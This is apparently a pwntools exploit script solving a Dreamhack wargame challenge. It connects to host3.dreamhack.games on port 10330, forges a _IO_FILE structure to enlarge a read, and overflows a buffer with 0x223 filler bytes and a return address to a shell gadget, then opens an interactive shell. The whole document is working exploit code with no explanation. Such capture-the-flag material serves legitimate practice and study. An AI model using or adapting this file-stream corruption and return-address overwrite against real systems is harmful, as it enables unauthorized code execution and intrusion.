from pwn import *

context.arch='amd64'
HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 10330
r = remote(HOST, PORT)

size=0x602010
sh=0x4009fa
payload = flat([
    0xfbad208b,
    0, 0, 0, 0, 0, 0,
    size,
])
r.sendlineafter(b'# ', b'printf ' + payload)
r.sendlineafter(b'# ', b'read')
r.sendline(p64(0x300))
r.sendlineafter(b'# ', b'exit\x00' + b'A'*0x223+p64(sh))
r.interactive()